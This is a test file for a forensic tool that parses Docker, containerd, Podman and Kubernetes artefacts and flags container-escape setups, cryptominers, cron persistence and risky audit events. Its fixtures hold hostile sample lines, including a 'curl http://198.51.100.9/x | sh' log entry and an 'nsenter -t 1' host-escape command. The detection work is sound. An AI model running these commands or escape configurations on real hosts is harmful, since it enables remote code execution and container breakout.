"""Docker and Kubernetes artefacts: collection (collect/linux.py) and processing
(process/extractions/containers.py and k8s_audit.py, routed by process/linux_artefacts.py)."""
import csv
import json
import os
import sys
from pathlib import Path

# Appended, not prepended, as it always was (src/analysis/platform shadowed the stdlib module until it became platform_adapters).
sys.path.append(str(Path(__file__).resolve().parents[2] / "src" / "analysis"))

from rowanholt.core.records import check_file, own_fields, read_records  # noqa: E402
from rowanholt.collect import linux as collect  # noqa: E402
from rowanholt.process import linux_artefacts as la  # noqa: E402
from rowanholt.process.extractions import bbolt, containers, k8s_audit  # noqa: E402

CID = "4f1c9e2ab3d7" + "0" * 52
# Made by containerd 1.7 itself (lab/linux-targets/seed/containerd/make-meta-db.sh)
META_DB = Path(__file__).resolve().parents[2] / "lab" / "linux-targets" / "seed" / "containerd" / "meta.db"


def host(tmp_path):
    linux = tmp_path / "out" / "HOST" / "artefacts" / "raw" / "linux"
    linux.mkdir(parents=True)
    return str(tmp_path / "out") + "/", linux


def run(out, artefact):
    return la.process_linux_artefact("", "'HOST'", out, "HOST::Linux", "/", "processing", str(artefact))


def rows(out, name):
    """A cooked table's rows as Elrond wrote them (JSON Lines), without the envelope; every record
    checked for it first."""
    path = Path(out) / "HOST" / "artefacts" / "cooked" / f"{name}.jsonl"
    assert check_file(path) == []
    return [own_fields(r) for _, r in read_records(path)]


def techniques(out):
    path = Path(out) / "mitre_techniques.txt"
    return path.read_text().split() if path.exists() else []


def flat(path):
    return path.lstrip("/").replace("/", "+")


def docker_config(linux, privileged, binds, command="/bin/sh -c sleep infinity"):
    prefix = flat(f"/var/lib/docker/containers/{CID}/")
    path, *args = command.split(" ", 1)
    (linux / (prefix + "config.v2.json")).write_text(json.dumps({
        "ID": CID, "Name": "/miner", "Created": "2026-10-20T09:00:00Z", "Path": path, "Args": args,
        "State": {"Running": True, "StartedAt": "2026-10-20T09:00:01Z"},
        "Config": {"Image": "alpine:3.20", "User": ""}, "MountPoints": {},
    }))
    (linux / (prefix + "hostconfig.json")).write_text(json.dumps({
        "Privileged": privileged, "Binds": binds, "PidMode": "host" if privileged else "", "CapAdd": ["SYS_ADMIN"] if privileged else [],
    }))
    return linux / (prefix + "config.v2.json")


def test_escape_capable_container(tmp_path):
    out, linux = host(tmp_path)
    assert run(out, docker_config(linux, True, ["/var/run/docker.sock:/var/run/docker.sock", "/:/host:ro"]))
    assert run(out, linux / flat(f"/var/lib/docker/containers/{CID}/hostconfig.json"))  # read with the config
    (row,) = rows(out, "docker_containers")
    assert row["Container"] == CID[:12] and row["Image"] == "alpine:3.20" and row["User"] == "root"
    assert row["Runtime"] == "docker"
    for flag in ("privileged", "container runtime socket mounted (/var/run/docker.sock)",
                 "host path mounted read-only (/)", "host PID namespace", "capabilities SYS_ADMIN"):
        assert flag in row["Flag"]
    assert techniques(out) == ["T1610", "T1611"]


def test_ordinary_container_is_not_a_finding(tmp_path):
    out, linux = host(tmp_path)
    run(out, docker_config(linux, False, ["/srv/app/data:/data"], command="nginx -g daemon off;"))
    (row,) = rows(out, "docker_containers")
    assert row["Flag"] == "" and techniques(out) == []


def test_container_logs(tmp_path):
    out, linux = host(tmp_path)
    log = linux / flat(f"/var/lib/docker/containers/{CID}/{CID}-json.log")
    log.write_text(json.dumps({"log": "connecting to pool\n", "stream": "stdout", "time": "2026-10-20T09:00:02Z"}) + "\n")
    pod = linux / flat("/var/log/pods/payments_api-7d9f_0b1c/api/0.log")
    pod.write_text("2026-10-20T09:01:00.123Z stderr F curl http://198.51.100.9/x | sh\n")
    run(out, log)
    run(out, pod)
    docker, cri = rows(out, "container_logs")
    assert docker["Runtime"] == "docker" and docker["Message"] == "connecting to pool"
    assert (cri["Namespace"], cri["Pod"], cri["Container"], cri["Stream"]) == ("payments", "api-7d9f", "api", "stderr")


def test_writable_layer_changes(tmp_path):
    out, linux = host(tmp_path)
    listing = linux / "gandalf+container_changes.csv"
    listing.write_text("Container,Path,Size,Mode,Kind,SHA256,MTime\n"
                       "4f1c9e2ab3d7,/tmp/.x/xmrig,4096,0o755,elf,ab,1792000000\n"
                       "4f1c9e2ab3d7,/etc/crontabs/root,10,0o600,,,1792000000\n"
                       "4f1c9e2ab3d7,/etc/cron.d/update,10,0o644,,,1792000000\n"
                       "4f1c9e2ab3d7,/var/cache/apk/APKINDEX,10,0o644,,,1792000000\n")
    run(out, listing)
    found = {r["Path"]: r["Flag"] for r in rows(out, "container_changes")}
    assert found["/tmp/.x/xmrig"] == "executable in a temporary or hidden path"
    assert found["/etc/cron.d/update"] == "cron changed"
    assert found["/var/cache/apk/APKINDEX"] == ""
    assert techniques(out) == ["T1053.003", "T1105"]


def test_static_pods(tmp_path):
    out, linux = host(tmp_path)
    (linux / flat("/etc/kubernetes/manifests/kube-apiserver.yaml")).write_text(
        "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-apiserver\n  namespace: kube-system\n"
        "spec:\n  hostNetwork: true\n  containers:\n  - image: registry.k8s.io/kube-apiserver:v1.31.0\n")
    (linux / flat("/etc/kubernetes/manifests/node-agent.yaml")).write_text(
        "apiVersion: v1\nkind: Pod\nmetadata:\n  name: node-agent\nspec:\n  hostPID: true\n  containers:\n"
        "  - image: docker.io/library/busybox\n    securityContext:\n      privileged: true\n"
        "  volumes:\n  - name: root\n    hostPath:\n      path: /\n")
    run(out, linux / flat("/etc/kubernetes/manifests/kube-apiserver.yaml"))
    assert techniques(out) == []
    run(out, linux / flat("/etc/kubernetes/manifests/node-agent.yaml"))
    agent = [r for r in rows(out, "static_pods") if r["Name"] == "node-agent"][0]
    assert agent["Flag"] == "not a control-plane pod; privileged; host PID namespace; host path /"
    assert techniques(out) == ["T1543.005", "T1611"]


def audit_event(user, verb, resource, subresource="", namespace="default", code=200, request=None):
    return {"apiVersion": "audit.k8s.io/v1", "kind": "Event", "auditID": "x", "stage": "ResponseComplete",
            "requestReceivedTimestamp": "2026-10-20T10:00:00Z", "user": {"username": user, "groups": []},
            "sourceIPs": ["203.0.113.7"], "verb": verb,
            "objectRef": {"resource": resource, "subresource": subresource, "namespace": namespace, "name": "x"},
            "responseStatus": {"code": code}, **({"requestObject": request} if request else {})}


def test_kubernetes_audit_log(tmp_path):
    out, linux = host(tmp_path)
    log = linux / flat("/var/log/kubernetes/audit/audit.log")
    events = [
        audit_event("system:serviceaccount:kube-system:replicaset-controller", "create", "pods"),
        audit_event("mallory", "list", "secrets"),
        audit_event("mallory", "create", "pods", "exec"),
        audit_event("mallory", "create", "clusterrolebindings", request={"roleRef": {"name": "cluster-admin"}}),
        audit_event("mallory", "create", "pods", request={"spec": {"hostPID": True, "containers": [{}]}}),
        audit_event("mallory", "list", "nodes", namespace=""),
        audit_event("system:anonymous", "get", "pods", code=403),
        {**audit_event("mallory", "get", "pods"), "stage": "RequestReceived"},
    ]
    log.write_text("\n".join(json.dumps(e) for e in events) + "\n")
    run(out, log)
    found = [(r["User"], r["Flag"], r["Technique"]) for r in rows(out, "k8s_audit")]
    assert len(found) == 7  # RequestReceived is the same request again
    assert found[0][1] == ""  # a controller creating pods is Kubernetes doing its job
    assert ("mallory", "secrets read", "T1552.007") in found
    assert ("mallory", "exec into a pod", "T1609") in found
    assert ("mallory", "role binding created to cluster-admin", "T1098.006") in found
    assert ("mallory", "pod created with host PID namespace", "T1611") in found
    assert ("mallory", "cluster-wide list of nodes", "T1613") in found
    assert techniques(out) == sorted(["T1098.006", "T1552.007", "T1609", "T1611", "T1613"])


def test_exported_audit_log_formats(tmp_path):
    items = [audit_event("mallory", "list", "secrets")]
    (tmp_path / "items.json").write_text(json.dumps({"kind": "EventList", "items": items}))
    (tmp_path / "array.json").write_text(json.dumps(items))
    for name in ("items.json", "array.json"):
        assert k8s_audit.looks_like_audit_log(str(tmp_path / name))
        assert k8s_audit.audit_rows(str(tmp_path / name))[0]["Technique"] == "T1552.007"
    (tmp_path / "other.log").write_text("Oct 20 10:00:00 host sshd[1]: Accepted publickey\n")
    assert not k8s_audit.looks_like_audit_log(str(tmp_path / "other.log"))


def test_writable_layer_listing_from_an_image(tmp_path):
    mnt = tmp_path / "mnt"
    docker = mnt / "var" / "lib" / "docker"
    (docker / "containers" / CID).mkdir(parents=True)
    (docker / "image" / "overlay2" / "layerdb" / "mounts" / CID).mkdir(parents=True)
    (docker / "image" / "overlay2" / "layerdb" / "mounts" / CID / "mount-id").write_text("abc123\n")
    upper = docker / "overlay2" / "abc123" / "diff"
    (upper / "tmp" / ".x").mkdir(parents=True)
    (upper / "tmp" / ".x" / "xmrig").write_bytes(b"\x7fELF" + b"\0" * 60)
    (upper / "etc").mkdir()
    (upper / "etc" / "motd").write_text("hi\n")
    found = {r["Path"]: r for r in collect.container_change_listing(str(mnt))}
    assert found["/tmp/.x/xmrig"]["Kind"] == "elf" and len(found["/tmp/.x/xmrig"]["SHA256"]) == 64
    assert found["/etc/motd"]["Kind"] == "" and found["/etc/motd"]["SHA256"] == ""
    assert {r["Container"] for r in found.values()} == {CID[:12]}


def test_collection_lists_agree():
    """gandalf.sh, gandalf.py and Elrond's image collection take the same container paths."""
    repo = Path(__file__).resolve().parents[2]
    bash = (repo / "src" / "acquisition" / "bash" / "gandalf.sh").read_text()
    python = (repo / "src" / "acquisition" / "python" / "collect_artefacts-py").read_text()
    for top, depth, _, suffixes in collect.LINUX_EXTRA_DIRS:
        if top.startswith(("/var/lib/docker", "/var/log/pods", "/etc/kubernetes", "/var/log/kubernetes")):
            assert f'("{top}", {depth},' in python
            for suffix in suffixes:
                if suffix != ".json":  # gandalf.sh takes YAML manifests only
                    assert f"{top}|{depth}|" in bash and f"|{suffix}\n" in bash
    assert os.path.basename(la.DOCKER_CONTAINERS.rstrip("/")) == "containers"


def test_containerd_metadata(tmp_path):
    out, linux = host(tmp_path)
    copy = linux / flat("/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db")
    copy.write_bytes(META_DB.read_bytes())
    assert run(out, copy)
    found = {r["Container"]: r for r in rows(out, "docker_containers")}
    assert set(found) == {"lab-escape", "lab-web", "9b2e7c41d0a8"}
    escape = found["lab-escape"]
    assert (escape["Runtime"], escape["Name"], escape["Image"], escape["User"]) == \
        ("containerd", "default: lab-escape", "docker.io/library/alpine:3.20", "root")
    assert escape["Command"] == "sh -c nsenter -t 1 -m -u -i -n sh" and escape["Created"].startswith("2026-11-02T14:22:13")
    assert escape["Privileged"] == "True" and escape["PidMode"] == "host"  # joined PID 1's namespace
    for flag in ("privileged", "host path mounted read-write (/)", "host PID namespace", "capabilities SYS_ADMIN"):
        assert flag in escape["Flag"]
    assert found["lab-web"]["Flag"] == "" and found["lab-web"]["Privileged"] == "False"
    pod = found["9b2e7c41d0a8"]
    assert pod["Name"] == "k8s.io: kube-system/lab-node-agent/agent"
    # Host network, and the resolver files every such container gets read-only aren't a finding
    assert pod["Flag"] == "host network"
    assert techniques(out) == ["T1610", "T1611"]


PODMAN = Path(__file__).resolve().parents[2] / "lab" / "linux-targets" / "seed" / "podman"


def test_podman_state(tmp_path):
    """Podman 5's SQLite state and Podman 4's bbolt one (both made by Podman: make-podman-state.sh)
    give the same containers."""
    out, linux = host(tmp_path)
    for name, path in (("db.sql", "/var/lib/containers/storage/db.sql"),
                       ("bolt_state.db", "/var/lib/containers/storage/libpod/bolt_state.db")):
        (linux / flat(path)).write_bytes((PODMAN / name).read_bytes())
        assert run(out, linux / flat(path))
    found = rows(out, "docker_containers")
    assert len(found) == 6 and {r["Runtime"] for r in found} == {"podman"}
    for name in ("lab-escape", "lab-web", "lab-sock"):
        flags = {r["Flag"] for r in found if r["Name"] == name}
        assert len(flags) == 1, (name, flags)  # the same from both stores
    escape = next(r for r in found if r["Name"] == "lab-escape")
    assert escape["Privileged"] == "True" and escape["Image"] == "docker.io/library/alpine:3.20"
    assert escape["Running"] == "False" and escape["Created"].startswith("2026-11-02T15:00:")
    for flag in ("privileged", "host path mounted read-write (/)", "host PID namespace", "capabilities SYS_ADMIN, SYS_PTRACE"):
        assert flag in escape["Flag"]
    sock = next(r for r in found if r["Name"] == "lab-sock")
    assert sock["Flag"] == "container runtime socket mounted (/run/podman/podman.sock); host network; capabilities SYS_PTRACE"
    assert next(r for r in found if r["Name"] == "lab-web")["Flag"] == ""
    assert techniques(out) == ["T1610", "T1611"]


def test_podman_sqlite_reads_its_wal_and_leaves_the_case_copy_alone(tmp_path):
    import hashlib
    import shutil
    import sqlite3
    # A live host's database with a write still in its WAL: a container renamed after the last checkpoint
    db = tmp_path / "live" / "db.sql"
    db.parent.mkdir()
    db.write_bytes((PODMAN / "db.sql").read_bytes())
    live = sqlite3.connect(str(db))
    live.execute("PRAGMA journal_mode=WAL")
    live.execute("PRAGMA wal_autocheckpoint=0")
    live.execute("UPDATE ContainerConfig SET JSON = json_set(JSON, '$.name', 'lab-renamed') WHERE Name = 'lab-web'")
    live.commit()
    wal = Path(str(db) + "-wal")
    assert wal.stat().st_size > 0
    # Collected while it's open, as they'd sit in raw/
    copy = tmp_path / "raw"
    copy.mkdir()
    shutil.copyfile(db, copy / db.name)
    shutil.copyfile(wal, copy / wal.name)
    live.close()
    before = {p.name: hashlib.sha256(p.read_bytes()).hexdigest() for p in copy.iterdir()}
    names = {r["Name"] for r in containers.podman_sqlite_rows(str(copy / db.name))}
    assert "lab-renamed" in names and "lab-web" not in names
    assert {p.name: hashlib.sha256(p.read_bytes()).hexdigest() for p in copy.iterdir()} == before


def test_bbolt_refuses_what_it_cannot_read(tmp_path):
    import pytest
    junk = tmp_path / "junk.db"
    junk.write_bytes(b"\0" * 8192)
    with pytest.raises(bbolt.BoltError):
        bbolt.Bolt(str(junk))
    # A torn first meta page: the second one, written by the same transaction or the one before, is used
    data = bytearray(META_DB.read_bytes())
    data[16 + 60] ^= 0xFF  # the first meta page's checksum
    torn = tmp_path / "torn.db"
    torn.write_bytes(bytes(data))
    assert bbolt.Bolt(str(torn)).root().bucket(b"v1") is not None
    # A page pointing outside the file
    cut = tmp_path / "cut.db"
    cut.write_bytes(META_DB.read_bytes()[:3 * 4096])
    with pytest.raises(bbolt.BoltError):
        containers.containerd_rows(str(cut))


def test_lab_seed_end_to_end(tmp_path):
    """The lab targets' container seed, collected the way Elrond collects an image, gives the
    findings lab/linux-targets/seed/seed-artefacts.sh's expected.json promises."""
    import subprocess
    repo = Path(__file__).resolve().parents[2]
    mnt = tmp_path / "mnt"
    subprocess.run(["sh", str(repo / "lab" / "linux-targets" / "seed" / "seed-containers.sh")],
                   env={**os.environ, "ROOT": str(mnt)}, check=True)
    out = str(tmp_path / "out") + "/"
    raw = Path(out) / "HOST" / "artefacts" / "raw"
    raw.mkdir(parents=True)
    collect.collect_linux_extras(str(mnt), str(raw) + "/", "HOST::Linux", out, "collecting", 0)
    for artefact in sorted((raw / "linux").iterdir()):
        run(out, artefact)
    (container,) = [r for r in rows(out, "docker_containers") if r["Runtime"] == "docker"]
    assert "container runtime socket mounted" in container["Flag"] and "host path mounted read-write (/)" in container["Flag"]
    escape = next(r for r in rows(out, "docker_containers") if r["Container"] == "lab-escape")
    assert escape["Runtime"] == "containerd" and "host PID namespace" in escape["Flag"]
    sock = next(r for r in rows(out, "docker_containers") if r["Name"] == "lab-sock")
    assert sock["Runtime"] == "podman" and "/run/podman/podman.sock" in sock["Flag"]
    assert any("c2.rivendell-lab.test" in r["Message"] for r in rows(out, "container_logs"))
    changes = {r["Path"]: r["Flag"] for r in rows(out, "container_changes")}
    assert changes["/tmp/.x/lab-miner"] == "executable in a temporary or hidden path"
    assert changes["/etc/cron.d/lab-miner"] == "cron changed"
    assert [r["Name"] for r in rows(out, "static_pods")] == ["lab-node-agent"]
    audit = {r["Flag"] for r in rows(out, "k8s_audit")}
    assert {"secrets read", "exec into a pod", "role binding created to cluster-admin"} <= audit
    assert {"T1611", "T1610", "T1105", "T1053.003", "T1543.005", "T1552.007", "T1609", "T1098.006"} <= set(techniques(out))


def test_rootless_podman_is_collected_from_each_home_and_marked_with_its_user(tmp_path):
    """A user's own Podman store (~/.local/share/containers/storage), collected the way Elrond
    collects an image, reaches docker_containers.csv with the user in its Runtime."""
    mnt = tmp_path / "mnt"
    storage = mnt / "home" / "alice" / ".local" / "share" / "containers" / "storage"
    (storage / "libpod").mkdir(parents=True)
    (storage / "db.sql").write_bytes((PODMAN / "db.sql").read_bytes())
    (storage / "libpod" / "bolt_state.db").write_bytes((PODMAN / "bolt_state.db").read_bytes())
    out = str(tmp_path / "out") + "/"
    raw = Path(out) / "HOST" / "artefacts" / "raw"
    raw.mkdir(parents=True)
    collect.collect_linux_extras(str(mnt), str(raw) + "/", "HOST::Linux", out, "collecting", 0)
    collected = sorted(p.name for p in (raw / "user_profiles").iterdir())
    assert collected == ["alice+bolt_state.db", "alice+db.sql"]
    for name in collected:
        assert run(out, raw / "user_profiles" / name)
    found = rows(out, "docker_containers")
    assert len(found) == 6 and {r["Runtime"] for r in found} == {"podman (rootless, alice)"}
    assert "privileged" in next(r for r in found if r["Name"] == "lab-escape")["Flag"]
    assert techniques(out) == ["T1610", "T1611"]
